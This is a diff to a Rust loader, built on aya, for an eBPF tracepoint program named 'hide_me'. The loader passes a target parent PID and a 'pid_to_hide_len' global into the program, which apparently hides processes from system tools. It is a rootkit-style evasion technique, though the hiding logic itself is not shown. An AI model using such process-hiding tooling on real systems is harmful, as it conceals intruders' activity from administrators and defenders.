@@ -1,6 +1,6 @@
 use aya::{
     include_bytes_aligned,
-    maps::{array::ProgramArray, HashMap},
+    maps::array::ProgramArray,
     programs::TracePoint,
     EbpfLoader,
 };
@@ -12,17 +12,13 @@ use tokio::signal;
 #[derive(Debug, Parser)]
 struct TargetPpid {
     #[clap(short, long, default_value = "0")]
-    ppid: i32,
+    ppid: u64,
 }
 
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
     let opt = TargetPpid::parse();
-    let ppid = opt.ppid.to_string();
 
-    // unsafe {
-    //     core::ptr::write_volatile(&mut pid_to_hide_len as *mut u64, ppid.len() as u64 + 1);
-    // }
     env_logger::init();
 
     // Bump the memlock rlimit. This is needed for older kernels that don't use the
@@ -41,7 +37,8 @@ async fn main() -> Result<(), anyhow::Error> {
     // like to specify the eBPF program at runtime rather than at compile-time, you can
     // reach for `Bpf::load_file` instead.
     let mut bpf = EbpfLoader::new()
-        .set_global("pid_to_hide_len", &(ppid.len() as u64 + 1), true)
+        .set_global("pid_to_hide_len", &(opt.ppid.to_string().len() as u64 + 1), true)
+        .set_global("target_ppid", &opt.ppid, true)
         .load(include_bytes_aligned!(
             "../../target/bpfel-unknown-none/debug/hide-me"
         ))?;
@@ -50,11 +47,6 @@ async fn main() -> Result<(), anyhow::Error> {
         // This can happen if you remove all log statements from your eBPF program.
         warn!("failed to initialize eBPF logger: {}", e);
     }
-
-    let mut target_ppid: HashMap<_, u8, i32> =
-        HashMap::try_from(bpf.map_mut("target_ppid").unwrap())?;
-
-    target_ppid.insert(0, opt.ppid, 0).unwrap();
 
     let program: &mut TracePoint = bpf.program_mut("hide_me").unwrap().try_into()?;
 
